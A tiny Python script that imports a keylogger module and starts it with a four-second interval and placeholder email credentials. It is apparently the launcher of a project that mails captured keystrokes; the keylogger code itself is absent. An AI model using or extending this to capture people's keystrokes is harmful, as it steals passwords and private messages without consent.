#!/usr/bin/env python
import keylogger


my_keylogger = keylogger.Keylogger(4, "test@gmail.com", "password")
my_keylogger.start()
